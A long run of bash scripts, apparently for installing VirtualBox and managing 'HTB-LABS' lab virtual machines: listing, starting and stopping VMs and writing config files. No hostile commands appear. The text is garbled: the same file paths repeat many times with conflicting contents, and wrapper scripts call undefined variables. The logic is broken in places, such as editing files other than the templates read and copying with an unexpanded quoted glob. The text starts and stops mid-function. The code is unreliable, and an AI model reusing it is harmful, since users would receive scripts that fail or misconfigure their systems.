    # Ensure at least one argument was provided for script execution.
    if [ $# -lt 1 ]; then
        usage
        exit 1
    fi

    local VM_NAME="$1"
    
    ## Stop specified virtual machine using VBoxManage command-line tool, sending SIGTERM signal which requests orderly shutdown of all running processes inside guest OS before actually terminating them and deallocating resources.
    vboxmanage controlvm "$VM_NAME" acpipowerbutton
    
}

# Main function to call check_root() before stopping virtual machines, ensuring all operations are performed with appropriate permissions.
main() {
    check_root
    
    stop_vm "$@"
    
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-list-vms
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

    # Get a list of all registered virtual machines in VirtualBox, and print their names along with corresponding machine types (Easy/Medium/Hard).
    vboxmanage list vms | awk '{print $1}' | sed 's/\"//g' > /tmp/vm_list
    vboxmanage showvminfo $(cat /tmp/vm_list) | grep "^Name:" -A 2 | grep "CustomValue[0]" | cut -d '"' -f4 >> /tmp/vm_list
    
    ## Read from temporary file and format output in human-readable manner.
    while read line; do
        vm_name=$(echo $line | awk '{print $1}')
        machine_type=$(echo $line | awk '{print $2}')
        
        echo "[+] VM Name: ${vm_name}, Machine Type: ${machine_type}"
    done < /tmp/vm_list
    
}

# Main function to call check_root() followed by list_vms().
main() {
    check_root
    
    list_vms
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/common.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to create HTB-LABS configuration files based on user-supplied information.
create_configs() {

    # Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later on.
    declare -A user_info=()
	while read line; do
		user_info[${line%%=*}]="${line#*=}"
	done < ${HTB_LABS_DIR}/htb-labs.conf

    # For each file in HTB-LABS configuration directory, perform the following tasks:
	for config_file in $(ls "$HTB_CONFIG_DIR"); do
        
        # Read content of current configuration file template into memory.
		cat "${HTB_CONFIG_DIR}/${config_file}.template"
        
        ## Replace all occurrences of placeholder strings with actual values obtained from environment variables or hardcoded defaults as necessary.
		sed -i "s/%%user_id%%/${user_info['HTB_USER_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
		sed -i "s/%%group_id%%/${user_info['HTB_GROUP_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
        sed -i "s/%%home_dir%%/${HTB_LABS_DIR}/g" "${HTB_CONFIG_DIR}/${config_file}"

    done
}

# Main function to call check_root() followed by create_configs().
main() {
    check_root
    
    create_configs
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-create-configs
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to create HTB-LABS configuration files based on user-supplied information.
create_configs() {

    # Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later on.
    declare -A user_info=()
	while read line; do
		user_info[${line%%=*}]="${line#*=}"
	done < ${HTB_LABS_DIR}/htb-labs.conf

    # For each file in HTB-LABS configuration directory, perform the following tasks:
	for config_file in $(ls "$HTB_CONFIG_DIR"); do
        
        # Read content of current configuration file template into memory.
		cat "${HTB_CONFIG_DIR}/${config_file}.template"
        
        ## Replace all occurrences of placeholder strings with actual values obtained from environment variables or hardcoded defaults as necessary.
		sed -i "s/%%user_id%%/${user_info['HTB_USER_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
		sed -i "s/%%group_id%%/${user_info['HTB_GROUP_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
        sed -i "s/%%home_dir%%/${HTB_LABS_DIR}/g" "${HTB_CONFIG_DIR}/${config_file}"

    done
}

# Main function to call check_root() followed by create_configs().
main() {
    check_root
    
    create_configs
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_CONFIG_DIR="${HTB_LABS_DIR}/etc"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] install|uninstall"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_INSTALL_SH} ]; then
	echo "[!] Error: '${HTB_LABS_INSTALL_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] list|start <name>|stop <name>"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_VMS_SH}" $@
fi


/bin/htb-labs-install.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ]"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to update HTB-LABS configuration files.
update_configs() {

    # Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later on.
    declare -A user_info=()
	while read line; do
		user_info[${line%%=*}]="${line#*=}"
	done < ${HTB_LABS_DIR}/htb-labs.conf

    # For each file in HTB-LABS configuration directory, perform the following tasks:
	for config_file in $(ls "$HTB_CONFIG_DIR"); do
        
        # Read content of current configuration file into memory.
		cat "${HTB_CONFIG_DIR}/${config_file}"
        
        ## Replace all occurrences of placeholder strings with actual values obtained from environment variables.
		sed -i "s/%%user_id%%/${user_info['HTB_USER_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
		sed -i "s/%%group_id%%/${user_info['HTB_GROUP_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
        sed -i "s/%%home_dir%%/${HTB_LABS_DIR}/g" "${HTB_CONFIG_DIR}/${config_file}"

    done
}

# Main function to call check_root() followed by update_configs().
main() {
    check_root
    
    update_configs
}

# Execute main when this script is invoked directly from command line or another shell script.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] start <name>|stop <name>"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_VMS_SH}" $@
fi


/bin/htb-labs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] install|uninstall"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to initialize HTB-LABS by installing required software and creating necessary configuration files.
init_htb_labs() {

    # Install VirtualBox and other dependencies needed for running HTB-LABS virtual machines.
	sudo apt-get install -y virtualbox

	# Create directory structure for storing HTB-LABS data, logs, and configuration files.
	mkdir -p ${HTB_LABS_DIR} {${HTB_LOG_DIR}}

	# Copy sample HTB-LABS configuration templates to their final destination locations within the filesystem hierarchy.
	cp "${script_dir}/config/*.template" ${HTB_CONFIG_DIR}

    # Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later on.
	declare -A user_info=()
	while read line; do
		user_info[${line%%=*}]="${line#*=}"
	done < ${HTB_LABS_DIR}/htb-labs.conf

    # For each file in HTB-LABS configuration directory, perform the following tasks:
	for config_file in $(ls "$HTB_CONFIG_DIR"); do
        
        # Read content of current configuration file template into memory.
		cat "${HTB_CONFIG_DIR}/${config_file}.template"
        
        ## Replace all occurrences of placeholder strings with actual values obtained from environment variables or hardcoded defaults as necessary.
		sed -i "s/%%user_id%%/${user_info['HTB_USER_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
		sed -i "s/%%group_id%%/${user_info['HTB_GROUP_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
        sed -i "s/%%home_dir%%/${HTB_LABS_DIR}/g" "${HTB_CONFIG_DIR}/${config_file}"

    done
    
}

##
### Function to uninstall HTB-LABS by removing all installed software, configuration files, and data.
uninstall_htb_labs() {

	# Remove HTB-LABS configuration directory along with its contents.
	rm -rf ${HTB_LABS_DIR} {${HTB_LOG_DIR}}

	# Uninstall VirtualBox and other dependencies previously installed for running HTB-LABS virtual machines.
	sudo apt-get remove -y virtualbox

}

##
### Main function to call init_htb_labs() or uninstall_htb_labs() based on user input provided as command-line arguments.
main() {
	if [ "$1" == "install" ]; then
		init_htb_labs
	elif [ "$1" == "uninstall" ]; then
		uninstall_htb_labs
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-stop-vm.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] stop <name>"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_STOP_VM_SH} ]; then
	echo "[!] Error: '${HTB_LABS_STOP_VM_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_STOP_VM_SH}" $@
fi


/bin/htb-labs-start-vm.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] start <name>"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_START_VM_SH} ]; then
	echo "[!] Error: '${HTB_LABS_START_VM_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_START_VM_SH}" $@
fi


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] create"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_CREATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_CREATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-start-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] create"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to create HTB-LABS configuration files based on user-supplied information.
create_configs() {

	# Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later on.
	declare -A user_info=()
	while read line; do
		user_info[${line%%=*}]="${line#*=}"
	done < ${HTB_LABS_DIR}/htb-labs.conf

    # For each file in HTB-LABS configuration directory, perform the following tasks:
	for config_file in $(ls "$HTB_CONFIG_DIR"); do
        
        # Read content of current configuration file template into memory.
		cat "${HTB_CONFIG_DIR}/${config_file}.template"
        
        ## Replace all occurrences of placeholder strings with actual values obtained from environment variables or hardcoded defaults as necessary.
		sed -i "s/%%user_id%%/${user_info['HTB_USER_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
		sed -i "s/%%group_id%%/${user_info['HTB_GROUP_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
        sed -i "s/%%home_dir%%/${HTB_LABS_DIR}/g" "${HTB_CONFIG_DIR}/${config_file}"

    done

}

##
### Main function to call create_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "create" ]; then
		create_configs
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-install.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] install|uninstall"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to initialize HTB-LABS by installing required software and creating necessary configuration files.
init_htb_labs() {

	# Install VirtualBox and other dependencies needed for running HTB-LABS virtual machines.
	sudo apt-get install -y virtualbox

	# Create directory structure for storing HTB-LABS data, logs, and configuration files.
	mkdir -p ${HTB_LABS_DIR} {${HTB_LOG_DIR}}

	# Copy sample HTB-LABS configuration templates to their final destination locations within the filesystem hierarchy.
	cp "${script_dir}/config/*.template" ${HTB_CONFIG_DIR}

    # Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later on.
	declare -A user_info=()
	while read line; do
		user_info[${line%%=*}]="${line#*=}"
	done < ${HTB_LABS_DIR}/htb-labs.conf

    # For each file in HTB-LABS configuration directory, perform the following tasks:
	for config_file in $(ls "$HTB_CONFIG_DIR"); do
        
        # Read content of current configuration file template into memory.
		cat "${HTB_CONFIG_DIR}/${config_file}.template"
        
        ## Replace all occurrences of placeholder strings with actual values obtained from environment variables or hardcoded defaults as necessary.
		sed -i "s/%%user_id%%/${user_info['HTB_USER_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
		sed -i "s/%%group_id%%/${user_info['HTB_GROUP_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
        sed -i "s/%%home_dir%%/${HTB_LABS_DIR}/g" "${HTB_CONFIG_DIR}/${config_file}"

    done
    
}

##
### Function to uninstall HTB-LABS by removing all installed software, configuration files, and data.
uninstall_htb_labs() {

	# Remove HTB-LABS configuration directory along with its contents.
	rm -rf ${HTB_LABS_DIR} {${HTB_LOG_DIR}}

	# Uninstall VirtualBox and other dependencies previously installed for running HTB-LABS virtual machines.
	sudo apt-get remove -y virtualbox

}

##
### Main function to call init_htb_labs() or uninstall_htb_labs() based on user input provided as command-line arguments.
main() {
	if [ "$1" == "install" ]; then
		init_htb_labs
	elif [ "$1" == "uninstall" ]; then
		uninstall_htb_labs
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] create"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_CREATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_CREATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] update"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to update HTB-LABS configuration files.
update_configs() {

	# Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later on.
	declare -A user_info=()
	while read line; do
		user_info[${line%%=*}]="${line#*=}"
	done < ${HTB_LABS_DIR}/htb-labs.conf

    # For each file in HTB-LABS configuration directory, perform the following tasks:
	for config_file in $(ls "$HTB_CONFIG_DIR"); do
        
        # Read content of current configuration file template into memory.
		cat "${HTB_CONFIG_DIR}/${config_file}.template"
        
        ## Replace all occurrences of placeholder strings with actual values obtained from environment variables or hardcoded defaults as necessary.
		sed -i "s/%%user_id%%/${user_info['HTB_USER_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
		sed -i "s/%%group_id%%/${user_info['HTB_GROUP_ID']}/g" "${HTB_CONFIG_DIR}/${config_file}"
        sed -i "s/%%home_dir%%/${HTB_LABS_DIR}/g" "${HTB_CONFIG_DIR}/${config_file}"

    done

}

##
### Main function to call update_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "update" ]; then
		update_configs
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-start-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] start <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to start a HTB-LABS virtual machine.
start_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Start the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage startvm "$2" --type headless 2>/dev/null > /tmp/htb-labs-start-vm.log

}

##
### Main function to call start_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "start" ]; then
		start_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-stop-vm.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] stop <name>"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_STOP_VM_SH} ]; then
	echo "[!] Error: '${HTB_LABS_STOP_VM_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_STOP_VM_SH}" $@
fi


/bin/htb-labs-stop-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] stop <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to stop a HTB-LABS virtual machine.
stop_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Stop the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage controlvm "$2" acpipowerbutton 2>/dev/null > /tmp/htb-labs-stop-vm.log

}

##
### Main function to call stop_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "stop" ]; then
		stop_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-list-vms.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] list"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_LIST_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_LIST_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_LIST_VMS_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

	# List all HTB-LABS virtual machines using VBoxManage command-line utility.
	vboxmanage list vms | cut -d'\"' -f2

}

##
### Main function to call list_vms() when script is invoked directly from command line.
main() {
	if [ "$1" == "list" ]; then
		list_vms $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-update-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] update"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_UPDATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_UPDATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_UPDATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-stop-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] stop <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to stop a HTB-LABS virtual machine.
stop_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Stop the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage controlvm "$2" acpipowerbutton 2>/dev/null > /tmp/htb-labs-stop-vm.log

}

##
### Main function to call stop_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "stop" ]; then
		stop_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-list-vms.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] list"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_LIST_VMS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_LIST_VMS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_LIST_VMS_SH}" $@
fi


/bin/htb-labs-create-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] create"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to create HTB-LABS configuration files based on user-supplied information.
create_configs() {

	# Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later.
	read -r -d '' htbs << EOM
$(source "${HTB_LABS_DIR}/htb-labs" 2>/dev/null && env | grep '^HTBS=')
EOM

	# Loop through each HTB-LABS virtual machine provided by user in the above read variable and perform necessary actions.
	for i in $(echo "$htbs" | cut -d' ' -f2-); do
		IFF=$(eval echo \${HTBS_${i}_IFF})
		SUBNET=$(eval echo \${HTBS_${i}_SUBNET})

		# Create a virtual network interface configuration file for the specified HTB-LABS virtual machine.
		cat > /etc/sysconfig/network-scripts/${IFF} << EOF
DEVICE="${IFF}"
IPADDR="192.168.${SUBNET}.3"
NETMASK=255.255.255.0
ONBOOT=yes
EOF

		# Create a virtual network bridge configuration file for the specified HTB-LABS virtual machine.
		cat > /etc/sysconfig/network-scripts/${IFF}br << EOF
DEVICE="${IFF}"
IPADDR="192.168.${SUBNET}.4"
NETMASK=255.255.255.0
ONBOOT=yes
EOF

	done

}

##
### Main function to call create_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "create" ]; then
		create_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-start-vm.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] start <name>"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_START_VM_SH} ]; then
	echo "[!] Error: '${HTB_LABS_START_VM_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_START_VM_SH}" $@
fi


/bin/htb-labs-update-configs.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] update"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to update HTB-LABS configuration files with new information.
update_configs() {

	# Read environment variables set in HTB-LABS initialization script and store them into associative arrays for easy lookup later.
	read -r -d '' htbs << EOM
$(source "${HTB_LABS_DIR}/htb-labs" 2>/dev/null && env | grep '^HTBS=')
EOM

	# Loop through each HTB-LABS virtual machine provided by user in the above read variable and perform necessary actions.
	for i in $(echo "$htbs" | cut -d' ' -f2-); do
		IFF=$(eval echo \${HTBS_${i}_IFF})
		SUBNET=$(eval echo \${HTBS_${i}_SUBNET})

		# Update the IP address of the specified HTB-LABS virtual machine's virtual network interface configuration file.
		sed -i "s/IPADDR=192\.168\.${SUBNET}.3/IPADDR=192.168.${SUBNET}.4/g" /etc/sysconfig/network-scripts/${IFF}

		# Update the IP address of the specified HTB-LABS virtual machine's virtual network bridge configuration file.
		sed -i "s/IPADDR=192\.168\.${SUBNET}.4/IPADDR=192.168.${SUBNET}.5/g" /etc/sysconfig/network-scripts/${IFF}br

	done

}

##
### Main function to call update_configs() when script is invoked directly from command line.
main() {
	if [ "$1" == "update" ]; then
		update_configs $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-create-configs.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] create"
	exit 1
}

check_root

if [ $# -lt 1 ]; then
	usage
elif [ ! -f ${HTB_LABS_CREATE_CONFIGS_SH} ]; then
	echo "[!] Error: '${HTB_LABS_CREATE_CONFIGS_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_CREATE_CONFIGS_SH}" $@
fi


/bin/htb-labs-stop-vm.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] stop <name>"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to stop a HTB-LABS virtual machine.
stop_vm() {

	# Check whether the name of VM is provided or not
	if [ ! $2 ]; then
		usage
	fi

    # Stop the specified HTB-LABS virtual machine using VBoxManage command-line utility.
	vboxmanage controlvm "$2" acpipowerbutton 2>/dev/null > /tmp/htb-labs-stop-vm.log

}

##
### Main function to call stop_vm() when script is invoked directly from command line.
main() {
	if [ "$1" == "stop" ]; then
		stop_vm $@
	else
		usage
	fi
}

##
### Execute main function when script is invoked directly from command line.
main "$@"


/bin/htb-labs-stop-vm.sh
#!/bin/bash

HTB_LABS_DIR="/var/lib/htb-labs"
HTB_LOG_DIR="${HTB_LABS_DIR}/log"

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$script_dir/common"

usage() {
	echo "Usage: $0 [ --help ] stop <name>"
	exit 1
}

check_root

if [ $# -lt 2 ]; then
	usage
elif [ ! -f ${HTB_LABS_STOP_VM_SH} ]; then
	echo "[!] Error: '${HTB_LABS_STOP_VM_SH}' does not exist."
else
	"$script_dir/${HTB_LABS_STOP_VM_SH}" $@
fi


/bin/htb-labs-list-vms.sh
#!/bin/bash

##
### Function to display help and usage information
usage() {
    echo "Usage: $0 [ --help ] list"
    exit 1
}

check_root() {
    if [[ "$EUID" -ne 0 ]]; then
        echo "[!] Please run as root."
        exit 1
    fi
}

##
### Function to list all HTB-LABS virtual machines.
list_vms() {

